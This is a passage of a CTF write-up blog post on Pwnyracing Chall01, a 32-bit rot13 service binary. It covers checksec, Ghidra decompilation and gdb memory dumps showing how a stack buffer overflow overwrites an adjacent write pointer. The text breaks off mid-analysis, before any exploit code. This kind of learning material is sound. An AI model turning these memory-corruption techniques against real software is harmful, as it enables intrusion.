points="22,6 12,13 2,6"/></svg></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2022%2fpwnyracing%2fpwnyracing%2f&amp;source=https%3a%2f%2fdilagluc.github.io%2f&amp;title=Pwnyracing%3a%20Chall01&amp;summary=Pwnyracing%3a%20Chall01%2c%20by%20dilag%0a%0aUninitialised%20variable%20bug%20to%20write%20anywhere%20ain%20memory%0a" target=_blank rel=noopener aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a></li><li><a href=# onclick='return linkShare("Pwnyracing: Chall01","https://dilagluc.github.io/en/posts/2022/pwnyracing/pwnyracing/",`Pwnyracing: Chall01, by dilag

Uninitialised variable bug to write anywhere ain memory
`),!1' target=_self rel=noopener aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></a></li></ul></div><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://dilagluc.github.io/en/posts/>Posts</a></li><li><a href=https://dilagluc.github.io/en/about-dilag/>About Me</a></li></ul></div><div class=bg-img></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-date><span>Sep 11, 2022</span></div><h1>Pwnyracing: Chall01</h1></header><div class=post-description><p>Uninitialised variable bug to write anywhere ain memory</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 00-8.49-8.49L5 10.5V19h8.5z"/><line x1="16" y1="8" x2="2" y2="22"/><line x1="17.5" y1="15" x2="9" y2="15"/></svg><a href=https://dilagluc.github.io/en/about-dilag/ target=_blank>dilag</a></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://dilagluc.github.io/en/tags/pwn>pwn</a></span><span class=tag><a href=https://dilagluc.github.io/en/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>2766&nbspWords … ⏲ Reading Time:12 Minutes, 34 Seconds</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-09-11 19:34 +0000</p></div><hr class=post-end><div class=content><p>Hello everyone,</p><p>I hope that you&rsquo;re well. Last time, I found on twitter an interesting set of challenges made by <a href=https://github.com/0xb0bb>0xb0bb</a>. After taking a look on it, I saw directly that I could learn new things with this, so I decided to do a writeup for some of them. You can find the challenges <a href=https://github.com/0xb0bb/ctf-challs/tree/main/pwnyracing>here</a>.
I&rsquo;m going to try the first one. Let&rsquo;s start.</p><h2 id=first-look>First look<a href=#first-look class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>We&rsquo;re going to do the things like a real ctf challenges, all we need is on <code>dist</code> directory. Let&rsquo;s take a look on it. We&rsquo;re given two files, an <code>stripped ELF 32</code> binary file and libc file. Let&rsquo;s check a security mecanism used:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>└──╼ $pwn checksec chall01
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01&#39;</span>
</span></span><span style=display:flex><span>    Arch:     i386-32-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We can see that there is a partial relro, a canary and non executable stack(we supposed also that <code>PIE is enabled</code>).</p><p>Before start anything, we need to patch the binary to use a correct libc file (I made this mistake and found myself searching for days and days what&rsquo;s wrong). We will use <code>pwninit</code> for this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>└──╼ $pwninit 
</span></span><span style=display:flex><span>bin: ./chall01
</span></span><span style=display:flex><span>libc: ./libc.so.6
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fetching linker
</span></span><span style=display:flex><span>https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1_i386.deb
</span></span><span style=display:flex><span>unstripping libc
</span></span><span style=display:flex><span>https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_i386.deb
</span></span><span style=display:flex><span>warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory <span style=color:#f92672>(</span>os error 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>setting ./ld-2.27.so executable
</span></span><span style=display:flex><span>copying ./chall01 to ./chall01_patched
</span></span><span style=display:flex><span>running patchelf on ./chall01_patched
</span></span><span style=display:flex><span>writing solve.py stub
</span></span></code></pre></div><p>Now we have a patched binary file which use the right libc. Let run the binary and see what we have :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Welcome to rot13 as a service! - For all those hard <span style=color:#e6db74>&#34;sanity flag&#34;</span> CTF challenges
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>size: <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>data: AAAAAAAAA
</span></span><span style=display:flex><span>resp: NNNNNNNNN
</span></span><span style=display:flex><span>more? <span style=color:#f92672>(</span>y/n<span style=color:#f92672>)</span>: y
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>size: <span style=color:#ae81ff>2</span> 
</span></span><span style=display:flex><span>data: AAAAAAA
</span></span><span style=display:flex><span>resp: NNNNNNN
</span></span><span style=display:flex><span>more? <span style=color:#f92672>(</span>y/n<span style=color:#f92672>)</span>: n
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bye .....
</span></span></code></pre></div><p>So we can see the binary asks for a size and data and performs a rot13 operation on this data. Let&rsquo;s reverse it and see what we can do.</p><h2 id=reversing>Reversing<a href=#reversing class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Looking at the decompiled code in Ghidra, we find quickly the function that handling the operation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar1;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar2;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> in_GS_OFFSET;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> local_61;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> local_60;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>local_5c;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> local_58 [<span style=color:#ae81ff>64</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>local_18;
</span></span><span style=display:flex><span>  undefined4 local_14;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_10;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>);
</span></span><span style=display:flex><span>  local_14 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  local_60 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  local_5c <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>;
</span></span><span style=display:flex><span>  local_61 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#39;\0&#39;</span> <span style=color:#f92672>&lt;</span> local_61) {
</span></span><span style=display:flex><span>      iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getchar</span>();
</span></span><span style=display:flex><span>      local_61 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span>)iVar2;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (local_61 <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\n&#39;</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ungetc</span>((<span style=color:#66d9ef>int</span>)local_61,stdin);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    local_60 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>size: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>,<span style=color:#f92672>&amp;</span>local_60);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (local_60 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x49</span>) {
</span></span><span style=display:flex><span>      local_60 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x48</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;data: &#34;</span>);
</span></span><span style=display:flex><span>    local_18 <span style=color:#f92672>=</span> local_58;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>( true ) {
</span></span><span style=display:flex><span>      iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getchar</span>();
</span></span><span style=display:flex><span>      local_61 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span>)iVar2;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (((local_61 <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>||</span> (local_61 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>)) <span style=color:#f92672>||</span> (local_61 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\r&#39;</span>)) <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      pcVar1 <span style=color:#f92672>=</span> local_18 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>local_18 <span style=color:#f92672>=</span> local_61;
</span></span><span style=display:flex><span>      local_18 <span style=color:#f92672>=</span> pcVar1;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (local_61 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>) {
</span></span><span style=display:flex><span>      pcVar1 <span style=color:#f92672>=</span> local_18 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>local_18 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>      local_18 <span style=color:#f92672>=</span> pcVar1;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    local_5c <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(local_60);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>FUN_080488b4</span>(local_58,local_5c,local_60);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;resp: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,local_5c);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;more? (y/n): &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(local_58,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0x40</span>);
</span></span><span style=display:flex><span>    iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#f92672>&amp;</span>DAT_08050c5e,<span style=color:#f92672>&amp;</span>local_61);
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>while</span> ((iVar2 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&amp;&amp;</span> ((local_61 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;y&#39;</span> <span style=color:#f92672>||</span> (local_61 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;Y&#39;</span>))));
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>FUN_0804883e</span>();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>FUN_08048d40</span>();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So we can see it asks for a <code>size</code> and sets it to <code>0x48</code> if <code>size &lt; 0x49</code>. Size is saved into <code>local_60</code> variable. After that it asks for a data, sets <code>local_18</code> pointer to <code>local_58</code> buffer and starts reading data byte by byte into this buffer. So basically it uses <code>local_18</code> pointer to write into <code>local_58</code> buffer and since <code>local_18</code> pointer is right after the buffer we can write into that pointer, but we can just rewrite the LSB to point to another location.
Let&rsquo;s see it with gdb:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048aee:	<span style=color:#a6e22e>call</span>   <span style=color:#ae81ff>0x80485a0</span> &lt;<span style=color:#66d9ef>printf@plt</span>&gt;  <span style=color:#75715e>//ask for data
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048af3:	<span style=color:#a6e22e>add</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0x10</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048af6:	<span style=color:#a6e22e>lea</span>    <span style=color:#66d9ef>eax</span>,[<span style=color:#66d9ef>ebp-0x54</span>]
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048af9:	<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x14</span>],<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048afc:	<span style=color:#a6e22e>jmp</span>    <span style=color:#ae81ff>0x8048b0d</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048afe:	<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>eax</span>,<span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x14</span>]
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048b01:	<span style=color:#a6e22e>lea</span>    <span style=color:#66d9ef>edx</span>,[<span style=color:#66d9ef>eax</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x1</span>]
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048b04:	<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x14</span>],<span style=color:#66d9ef>edx</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048b07:	<span style=color:#a6e22e>movzx</span>  <span style=color:#66d9ef>edx</span>,<span style=color:#66d9ef>BYTE</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>ebp-0x5d</span>]
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048b0b:	<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>BYTE</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>eax</span>],<span style=color:#66d9ef>dl</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x8048b0d:	<span style=color:#a6e22e>call</span>   <span style=color:#ae81ff>0x80485c0</span> &lt;<span style=color:#66d9ef>getchar@plt</span>&gt;
</span></span></code></pre></div><p>We can see that after asking for data, it loads <code>ebp-0x54</code> address into <code>eax</code> and sets <code>ebp-0x14</code> address to <code>eax</code>, so we can conclude that buffer is at <code>ebp-0x54</code> and pointer at <code>ebp-0x14</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>gef➤  p $ebp-0x54
</span></span><span style=display:flex><span>$6 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0xffffd064
</span></span><span style=display:flex><span>gef➤  p $ebp-0x14
</span></span><span style=display:flex><span>$7 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0xffffd0a4
</span></span><span style=display:flex><span>gef➤  x/30xw 0xffffd064
</span></span><span style=display:flex><span>0xffffd064:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd074:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd084:	0x41414141	0xff004141	0x08048824	0x08050b9c
</span></span><span style=display:flex><span>0xffffd094:	0xf7feae20	0xf7e5a2bb	0x080487f2	0xf7fca000
</span></span><span style=display:flex><span>0xffffd0a4:	0xffffd08b	0x00000000	0xff953d00	0xf7fcad80
</span></span><span style=display:flex><span>0xffffd0b4:	0x08052000	0xffffd078	0x08048cad	0x00000000
</span></span><span style=display:flex><span>0xffffd0c4:	0x5e1b0751	0x60e6a141	0x00000000	0x00000000
</span></span><span style=display:flex><span>0xffffd0d4:	0x00000000	0x00000001
</span></span></code></pre></div><p>We can see that the value at <code>0xffffd0a4</code> address is the address where <code>0x41</code> end, this is our pointer. We&rsquo;re on the right way :)<br>Another thing we can see in a decompiled code generated by Ghidra is our buffer is null byte terminate if only the input is <code>\n</code>. If our input is <code>\r</code>, we go to the malloc call without null terminated the buffer.</p><p>After asking for data, the program calls malloc with our size and calls <code>FUN_080488b4</code> with buffer, malloc result and size. Let&rsquo;s see <code>FUN_080488b4</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>FUN_080488b4</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>param_1,<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>param_2,<span style=color:#66d9ef>int</span> param_3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> cVar1;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar2;
</span></span><span style=display:flex><span>  ushort <span style=color:#f92672>**</span>ppuVar3;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar4;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> in_GS_OFFSET;
</span></span><span style=display:flex><span>  undefined auStack96 [<span style=color:#ae81ff>16</span>];
</span></span><span style=display:flex><span>  undefined4 uStack80;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_48;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>local_44;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>local_40;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>local_34;
</span></span><span style=display:flex><span>  undefined <span style=color:#f92672>*</span>local_30;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> local_2c;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_28;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>local_24 [<span style=color:#ae81ff>4</span>];
</span></span><span style=display:flex><span>  undefined4 local_14;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_10;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  uStack80 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x80488c1</span>;
</span></span><span style=display:flex><span>  local_40 <span style=color:#f92672>=</span> param_1;
</span></span><span style=display:flex><span>  local_44 <span style=color:#f92672>=</span> param_2;
</span></span><span style=display:flex><span>  local_48 <span style=color:#f92672>=</span> param_3;
</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>);
</span></span><span style=display:flex><span>  local_24[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>;
</span></span><span style=display:flex><span>  local_24[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>;
</span></span><span style=display:flex><span>  local_14 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  local_24[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>;
</span></span><span style=display:flex><span>  local_24[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style=display:flex><span>  local_30 <span style=color:#f92672>=</span> auStack96;
</span></span><span style=display:flex><span>  local_2c <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>);
</span></span><span style=display:flex><span>  local_28 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xd</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_44 <span style=color:#f92672>!=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) {
</span></span><span style=display:flex><span>    local_34 <span style=color:#f92672>=</span> local_44;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ((<span style=color:#f92672>*</span>local_40 <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\0&#39;</span> <span style=color:#f92672>&amp;&amp;</span> (local_48 <span style=color:#f92672>=</span> local_48 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, local_48 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>))) {
</span></span><span style=display:flex><span>    ppuVar3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__ctype_b_loc</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (((<span style=color:#f92672>*</span>ppuVar3)[<span style=color:#f92672>*</span>local_40] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x400</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>local_34 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>local_40;
</span></span><span style=display:flex><span>      local_40 <span style=color:#f92672>=</span> local_40 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>      local_34 <span style=color:#f92672>=</span> local_34 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      ppuVar3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__ctype_b_loc</span>();
</span></span><span style=display:flex><span>      pcVar2 <span style=color:#f92672>=</span> local_24[(<span style=color:#66d9ef>int</span>)(uint)(<span style=color:#f92672>*</span>ppuVar3)[<span style=color:#f92672>*</span>local_40] <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>      cVar1 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>local_40;
</span></span><span style=display:flex><span>      local_40 <span style=color:#f92672>=</span> local_40 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>      iVar4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>tolower</span>((<span style=color:#66d9ef>int</span>)cVar1);
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>local_34 <span style=color:#f92672>=</span> pcVar2[(local_28 <span style=color:#f92672>+</span> iVar4 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x61</span>) <span style=color:#f92672>%</span> (<span style=color:#66d9ef>int</span>)local_2c];
</span></span><span style=display:flex><span>      local_34 <span style=color:#f92672>=</span> local_34 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>)) {
